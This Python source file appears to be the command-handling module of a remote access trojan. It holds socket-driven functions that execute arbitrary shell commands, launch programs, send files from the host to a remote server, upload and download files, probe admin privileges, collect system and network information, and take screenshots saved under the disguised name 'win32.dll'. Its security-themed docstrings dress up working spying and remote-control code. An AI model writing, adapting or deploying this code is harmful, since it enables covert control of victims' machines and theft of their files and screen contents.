from socket_handlers import *
from urllib.parse import unquote
import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform
from pathvalidate import sanitize_filename, sanitize_filepath
from typing import Tuple
from mss import mss
from datetime import datetime


def pwd(socket):
    socket_send(socket, os.getcwd().encode("utf-8"))


def upload(socket, command):
    """
    Handles file upload from a client socket to the server.

    This function receives a file path and base64-encoded file data from a client,
    validates the path, decodes the data, and saves the file to the specified location.
    It includes security checks to prevent directory traversal and handles various error cases.

    Args:
        socket: The connected socket object for communication with the client.
        command: A string containing the destination file path for the upload.

    Returns:
        str: A status message indicating success or failure:
            - "[!] Error" if any error occurs during the process
            - No explicit return on success (only sends success message via socket)

    Raises:
        Various exceptions may occur during file operations or socket communication,
        but all are caught and handled internally with appropriate error messages.

    Security Notes:
        - Rejects paths containing '..', '~', '/' or '\' to prevent directory traversal
        - Validates file doesn't exist before writing to prevent overwrites
        - Creates parent directories if needed (with exist_ok=True)
        - Verifies file size after write to ensure complete transfer
        - Cleans up partial files if errors occur

    Example client-server interaction:
        1. Client sends: "/path/to/file.txt"
        2. Server validates path
        3. Client sends base64-encoded file data
        4. Server decodes and saves file
        5. Server responds with success/error message
    """
    try:
        # Get file path from command (safer than direct slicing)
        file_path = command.strip()
        if not file_path:
            socket_send(socket, "Error: No file path specified")
            return "[!] Error"

        # Validate file path (basic security check)
        if any(
            char in file_path
            for char in ["..", "~", "/", "\\"]
            if char not in os.path.basename(file_path)
        ):
            socket_send(socket, "Error: Invalid file path")
            return "[!] Error"

        # Receive file data
        data = socket_recv(socket)

        # Check if file exists to avoid overwriting
        if os.path.exists(file_path):
            socket_send(socket, f"Error: File {file_path} already exists")
            return "[!] Error"

        # Create directory if needed
        os.makedirs(os.path.dirname(file_path), exist_ok=True)

        # Write file with proper error handling
        try:
            decoded_data = base64.b64decode(data)
            with open(file_path, "wb") as fp:
                fp.write(decoded_data)

            # Verify file was written correctly
            if os.path.getsize(file_path) == len(decoded_data):
                socket_send(
                    socket, f"Success: {file_path} uploaded ({len(decoded_data)} bytes)"
                )
            else:
                socket_send(socket, f"Error: File size mismatch after upload")
                os.remove(file_path)  # Clean up partial file

        except (IOError, OSError) as e:
            socket_send(socket, f"Error: Failed to write file - {str(e)}")
            if os.path.exists(file_path):
                os.remove(file_path)  # Clean up partial file
        except binascii.Error:
            socket_send(socket, "Error: Invalid base64 data received")
    except Exception as e:
        socket_send(socket, f"Error: Unexpected error during upload - {str(e)}")


def urldownload(socket, url, max_size_mb=10, timeout=30):
    """
    Downloads a file from a given URL and saves it locally with security checks.

    This function performs the following operations:
    1. Validates the URL by sending a HEAD request first
    2. Checks server response status and content type
    3. Verifies file size against allowed maximum
    4. Sanitizes the filename
    5. Downloads the file in chunks with progress tracking
    6. Handles various error conditions appropriately

    Args:
        socket: Connected socket object for client communication
        url: URL of the file to download (str)
        max_size_mb: Maximum allowed file size in megabytes (default: 10)
        timeout: Connection/read timeout in seconds (default: 30)

    Returns:
        bool: True if download succeeds
        str: "[!] Error" string if any error occurs

    Raises:
        requests.exceptions.RequestException: For network-related errors
        IOError: For filesystem-related errors
        Exception: For unexpected errors (all caught and handled)

    Security Features:
        - Validates content type (only allows images and octet-stream)
        - Enforces maximum file size limit
        - Sanitizes filename before saving
        - Downloads in chunks to prevent memory issues
        - Verifies size during download to prevent overflow
        - Cleans up partial files if download fails

    Example:
        Successful download:
            >>> urldownload(socket, "http://example.com/image.jpg")
            True
            # Sends success message via socket

        Failed download (size exceeded):
            >>> urldownload(socket, "http://example.com/large_file.zip", max_size_mb=5)
            "[!] Error"
            # Sends error message via socket
    """
    try:
        with requests.head(url, timeout=timeout) as head_response:
            head_response.raise_for_status()

            if head_response.status_code != 200:
                socket_send(
                    socket,
                    f"Error: Server returned status code {head_response.status_code}",
                )
                return "[!] Error"

            content_type = head_response.headers.get("Content-Type", "")
            if not content_type.startswith(("image/", "application/octet-stream")):
                socket_send(socket, f"Error: Unsupported content type: {content_type}")
                return "[!] Error"

            content_length = int(head_response.headers.get("Content-Length", 0))
            max_size_bytes = max_size_mb * 1024 * 1024
            if content_length > max_size_bytes:
                socket_send(
                    socket,
                    f"Error: File size exceeds maximum allowed size ({max_size_mb}MB)",
                )
                return "[!] Error"

        with requests.get(url, stream=True, timeout=timeout) as response:
            response.raise_for_status()

            file_name = unquote(url.split("/")[-1])
            file_name = sanitize_filename(file_name)

            if not file_name:
                file_name = "downloaded_file"

            with open(file_name, "wb") as fp:
                downloaded_size = 0
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        fp.write(chunk)
                        downloaded_size += len(chunk)

                        if downloaded_size > max_size_bytes:
                            os.remove(file_name)
                            socket_send(
                                socket, f"Error: File size exceeded during download"
                            )
                            return "[!] Error"
            socket_send(
                socket,
                f"'{file_name}' successfully downloaded ({downloaded_size/1024:.2f} KB)",
            )
            return True

    except requests.exceptions.RequestException as e:
        socket_send(socket, f"[!] Error: Network error: {str(e)}")
    except IOError as e:
        socket_send(socket, f"[!] Error: File system error: {str(e)}")
    except Exception as e:
        socket_send(socket, f"[!] Error: Unexpected error: {str(e)}")


def send_file_to_server(sock, file_path, max_size_mb=10):
    """
    Sends a file to a server over a socket connection with security checks and progress tracking.

    This function performs the following operations:
    1. Validates and sanitizes the file path
    2. Verifies file existence and type (regular file)
    3. Checks file size against maximum allowed limit
    4. Sends file metadata (name, size, chunks) as base64-encoded JSON
    5. Transmits file content in 8KB chunks as base64-encoded data
    6. Provides completion/error feedback through the socket

    Args:
        sock: Connected socket object for server communication
        file_path: Path to the file to be sent (str)
        max_size_mb: Maximum allowed file size in megabytes (default: 10)

    Returns:
        bool: True if file transfer succeeds
        str: "[!] Error" string if any error occurs

    Raises:
        PermissionError: If file access is denied
        IOError: For filesystem-related errors
        Exception: For unexpected errors (all caught and handled)

    Security Features:
        - Sanitizes file path before processing
        - Validates file type (regular files only)
        - Enforces maximum file size limit
        - Transmits data in base64-encoded format
        - Uses chunked transfer to manage memory usage

    Protocol Details:
        - First sends file metadata as base64-encoded JSON containing:
          * name: Filename
          * size: Total file size in bytes
          * chunks: Total number of 8KB chunks
        - Then streams file content in base64-encoded 8KB chunks
        - Ends with completion message

    Example:
        Successful transfer:
            >>> send_file_to_server(sock, "/path/to/file.txt")
            True
            # Sends metadata, chunks, then completion message

        Failed transfer (file too large):
            >>> send_file_to_server(sock, "/path/to/large_file.iso", max_size_mb=5)
            "[!] Error"
            # Sends size limit error message
    """
    try:
        file_path = sanitize_filepath(file_path)
        if not os.path.exists(file_path):
            socket_send(sock, "Error: File Not Found!")
            return "[!] Error"

        if not os.path.isfile(file_path):
            socket_send(sock, "Error: Path is not a file!")
            return "[!] Error"

        file_size = os.path.getsize(file_path)
        max_size_bytes = max_size_mb * 1024 * 1024
        if file_size > max_size_bytes:
            socket_send(sock, f"Error: File size exceeds {max_size_mb}MB limit!")
            return "[!] Error"

        chunk_size = 8192  # 8KB
        with open(file_path, "rb") as fp:
            file_info = {
                "name": os.path.basename(file_path),
                "size": file_size,
                "chunks": (file_size // chunk_size) + 1,
            }
            socket_send(sock, base64.b64encode(str(file_info).encode()))

            for chunk in iter(lambda: fp.read(chunk_size), b""):
                socket_send(sock, base64.b64encode(chunk))

        socket_send(sock, "[+] File Transfer Complete")
        return True

    except PermissionError:
        socket_send(sock, "[!] Error: Permission denied!")
        return "[!] Error"
    except IOError as e:
        socket_send(sock, f"[!] Error: I/O operation failed - {str(e)}")
        return "[!] Error"
    except Exception as e:
        socket_send(sock, f"[!] Error: Unexpected error - {str(e)}")
        return "[!] Error"


def check_admin_privileges(socket) -> bool:
    """
    Checks if the current process has administrator/root privileges using multiple verification methods.

    This function performs privilege checks through:
    1. Windows API check (for Windows systems)
    2. Filesystem access test (writing to protected system directory)

    The function provides detailed status messages through the socket connection.

    Args:
        socket: Connected socket object for sending status/error messages

    Returns:
        bool: True if admin privileges are detected, False otherwise

    Behavior by OS:
        Windows:
            - First attempts Windows API check (IsUserAnAdmin)
            - Falls back to filesystem test if API unavailable
        Unix-like:
            - Performs filesystem test on system directories

    Security Notes:
        - Uses multiple verification methods for reliability
        - Cleans up test files if created
        - Never raises exceptions (all caught and handled)
        - Provides detailed feedback through socket

    Message Types:
        Success:
            - "[+] Administrator Privileges (Windows API Check)"
            - "[+] Administrator Privileges (System Directory Access)"
        Failure:
            - "[+] User Privileges (Access Denied: <error_type>)"
            - "[!] Privilege Check Error: <error_type>"

    Example Usage:
        >>> if check_admin_privileges(sock):
        ...     # Perform admin operations
        ... else:
        ...     # Request elevation or exit
    """
    try:
        if os.name == "nt":
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin:
                    socket_send(
                        socket, "[+] Administrator Privileges (Windows API Check)"
                    )
                    return True
            except (AttributeError, OSError):
                pass

        system_root = os.environ.get("SystemRoot", "C:\\Windows")
        test_path = os.path.join(system_root, "temp")

        try:
            os.listdir(test_path)
            test_file = os.path.join(test_path, "admin_test.tmp")
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
            socket_send(
                socket, "[+] Administrator Privileges (System Directory Access)"
            )
            return True
        except (IOError, OSError, PermissionError) as e:
            if os.path.exists(test_file):
                try:
                    os.remove(test_file)
                except:
                    pass
            error_type = type(e).__name__
            socket_send(socket, f"[+] User Privileges (Access Denied: {error_type})")
            return False

    except Exception as e:
        error_type = type(e).__name__
        socket_send(socket, f"[!] Privilege Check Error: {error_type}")
        return False


def execute_program(socket, command: str) -> bool:
    """
    Executes a program/command in a subprocess and reports the status via socket.

    This function handles program execution with proper error handling and status reporting.
    It supports both direct commands and 'run' prefixed commands (e.g., 'run notepad.exe').

    Args:
        socket: Connected socket object for status/error communication
        command: The command to execute (with optional 'run ' prefix)

    Returns:
        bool: True if program started successfully, False otherwise

    Features:
        - Handles 'run' prefix automatically (strips it if present)
        - Validates for empty commands
        - Captures and reports stderr if process fails immediately
        - Uses secure subprocess execution (shell=False)
        - Provides real-time status feedback via socket

    Error Handling:
        - FileNotFoundError: Program doesn't exist
        - PermissionError: Insufficient privileges
        - Other exceptions: Generic execution failure
        (All errors are properly formatted and sent via socket)

    Security Notes:
        - Uses shell=False to prevent shell injection
        - Doesn't support shell features (pipes, redirects, etc.)
        - Properly encodes/decodes process output

    Message Protocol:
        Success:
            "[+] Program started successfully"
        Errors:
            "[!] Empty command"
            "[!] Program not found"
            "[!] Permission denied"
            "[!] Failed to start: <error_details>"
            "[!] Execution failed (<error_type>)"

    Example:
        >>> execute_program(sock, "notepad.exe")
        True  # If successful
        >>> execute_program(sock, "run /bin/ls")
        True  # If successful
        >>> execute_program(sock, "invalid_cmd")
        False  # Sends appropriate error message
    """
    try:
        executable = command[4:] if command.startswith("run ") else command

        if not executable.strip():
            socket_send(socket, "[!] Empty command")
            return False

        process = subprocess.Popen(
            executable,
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )

        if process.poll() is not None:
            _, stderr = process.communicate()
            err_msg = stderr.decode("utf-8", errors="replace").strip()
            socket_send(socket, f"[!] Failed to start: {err_msg or 'Unknown error'}")
            return False

        socket_send(socket, "[+] Program started successfully")
        return True

    except FileNotFoundError:
        socket_send(socket, "[!] Program not found")
        return False
    except PermissionError:
        socket_send(socket, "[!] Permission denied")
        return False
    except Exception as e:
        error_type = type(e).__name__
        socket_send(socket, f"[!] Execution failed ({error_type})")
        return False


def take_screenshot(socket) -> bool:
    """
    Captures a screenshot, sends it through a socket connection, and cleans up temporary files.

    This function performs a full screenshot workflow:
    1. Captures the screen using mss (Multi-Screen Shot) library
    2. Saves temporarily to 'win32.dll' file
    3. Reads and encodes the screenshot in base64
    4. Transmits the encoded data through the socket
    5. Cleans up the temporary file
    6. Handles all potential errors with appropriate socket messages

    Args:
        socket: Connected socket object for data transmission and status reporting

    Returns:
        bool: True if screenshot was successfully captured and transmitted,
              False if any step in the process failed

    Workflow Details:
        - Uses mss library for cross-platform screenshot capture
        - Temporarily stores screenshot as 'win32.dll'
        - Transmits file contents as base64-encoded binary data
        - Implements comprehensive error handling at each stage
        - Includes cleanup phase even if transmission fails

    Error Handling:
        - Screenshot capture failures
        - File reading/writing errors
        - Data encoding/transmission problems
        - Temporary file cleanup issues
        (All errors are reported through socket connection)

    Security Notes:
        - Uses base64 encoding for safe data transmission
        - Cleans up temporary files even after failures
        - Limits exposure of sensitive data in error messages

    Message Protocol:
        Success:
            (Sends raw base64-encoded screenshot data)
        Errors:
            "[!] Screenshot capture failed: <error>"
            "[!] Screenshot file is empty"
            "[!] Error reading screenshot file: <error>"
            "[!] Error processing screenshot: <error>"
            "[!] Warning: Could not delete temp file: <error>"
            "[!] Unexpected error during screenshot: <error>"

    Example:
        >>> if take_screenshot(sock):
        ...     # Client receives base64 screenshot data
        ... else:
        ...     # Client receives error message
    """
    screenshot_file = "win32.dll"

    try:
        # Take screenshot
        with mss() as screenshot_tool:
            try:
                screenshot_tool.shot(output=screenshot_file)
            except Exception as e:
                socket_send(socket, f"[!] Screenshot capture failed: {str(e)}")
                return False

        # Read and send screenshot data
        try:
            with open(screenshot_file, "rb") as fp:
                screenshot_data = fp.read()
                fp.close()

            if not screenshot_data:
                socket_send(socket, "[!] Screenshot file is empty")
                return False

            # Encode and send the data
            encoded_data = base64.b64encode(screenshot_data)
            socket_send(socket, encoded_data)

        except IOError as e:
            socket_send(socket, f"[!] Error reading screenshot file: {str(e)}")
            return False
        except Exception as e:
            socket_send(socket, f"[!] Error processing screenshot: {str(e)}")
            return False

        # Clean up
        try:
            if os.path.exists(screenshot_file):
                os.remove(screenshot_file)
        except Exception as e:
            # Not critical if deletion fails, but we should log it
            socket_send(socket, f"[!] Warning: Could not delete temp file: {str(e)}")

        return True

    except Exception as e:
        socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
        return False


def execute_system_command(socket, command: str, timeout: int = 30) -> bool:
    """
    Executes a system command with timeout protection and returns output via socket.

    This function provides a secure way to execute shell commands with:
    - Input validation
    - Timeout protection
    - Comprehensive error handling
    - Real-time output capture

    Args:
        socket: Connected socket for command output and error reporting
        command: The system command to execute (must be non-empty string)
        timeout: Maximum execution time in seconds (default: 30)

    Returns:
        bool: True if command executed successfully (regardless of exit code),
              False if execution failed or timed out

    Features:
        - Validates command input before execution
        - Uses subprocess with shell=True for command execution
        - Captures both stdout and stderr streams
        - Enforces timeout to prevent hanging processes
        - Automatically terminates timed-out processes
        - Provides detailed error reporting through socket

    Security Considerations:
        - Uses shell=True (be cautious with untrusted input)
        - Limits maximum execution time
        - Properly handles process termination
        - Sanitizes error messages before transmission

    Error Handling:
        - Invalid command input
        - Command not found (FileNotFoundError)
        - Process timeout (TimeoutExpired)
        - Subprocess execution errors
        - Unexpected runtime errors

    Message Protocol:
        Success:
            (Raw command output sent via socket)
        Errors:
            "[!] Error: Invalid command"
            "[!] Error: Command timed out"
            "[!] Error: Command not found"
            "[!] Subprocess error: <details>"
            "[!] Unexpected error: <details>"

    Example:
        >>> execute_system_command(sock, "ls -l", timeout=10)
        True  # If command executes within timeout
        >>> execute_system_command(sock, "sleep 60", timeout=5)
        False  # Will timeout after 5 seconds
    """
    try:
        # Basic command validation
        if not command or not isinstance(command, str):
            socket_send(socket, "[!] Error: Invalid command")
            return False

        # Execute command with timeout
        result = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )

        try:
            stdout, stderr = result.communicate(timeout=timeout)
            socket_send(socket, stderr + stdout)
            return True

        except subprocess.TimeoutExpired:
            result.kill()
            socket_send(socket, "[!] Error: Command timed out")
            return False

    except FileNotFoundError:
        socket_send(socket, "[!] Error: Command not found")
        return False
    except subprocess.SubprocessError as e:
        socket_send(socket, f"[!] Subprocess error: {str(e)}")
        return False
    except Exception as e:
        socket_send(socket, f"[!] Unexpected error: {str(e)}")
        return False


def get_system_info(socket):
    try:
        system_info = {
            "platform": platform.system(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "processor": platform.processor(),
            "physical_cores": psutil.cpu_count(logical=False),
            "total_cores": psutil.cpu_count(logical=True),
            "cpu_usage": psutil.cpu_percent(interval=1),
            "total_ram": round(psutil.virtual_memory().total / (1024.0**3), 2),  # GB
            "available_ram": round(
                psutil.virtual_memory().available / (1024.0**3), 2
            ),  # GB
            "ram_usage": psutil.virtual_memory().percent,
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime(
                "%Y-%m-%d %H:%M:%S"
            ),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        return system_info
    except Exception as e:
        return {"error": f"Failed to gather system info: {str(e)}"}


def handle_sysinfo_command(socket) -> bool:
    try:
        system_info = get_system_info(socket)
        info_json = json.dumps(system_info)
        socket_send(socket, info_json)

        return True
    except ConnectionError as e:
        socket_send(socket, f"Connection error while sending sysinfo: {str(e)}")
        return False
    except Exception as e:
        socket_send(socket, f"Unexpected error in sysinfo command: {str(e)}")
        return False


def execute_netstat(socket: socket.socket) -> bool:
    try:
        result = subprocess.run(
            ["netstat", "-tuln"], capture_output=True, text=True, check=True
        )

        if result.returncode == 0:
            output = result.stdout
            if not output:
                socket_send(socket, "No netstat output available")
                return False
        else:
            socket_send(socket, f"netstat command failed with error:\n{result.stderr}")
            return False

        socket_send(socket, output)

    except subprocess.CalledProcessError as e:
        socket_send(socket, f"netstat command execution failed: {str(e)}")
        return False
    except FileNotFoundError:
        socket_send(
            socket, "netstat command not found (this might not work on Windows)"
        )
        return False
    except Exception as e:
        socket_send(socket, f"Unexpected error while running netstat: {str(e)}")
        return False
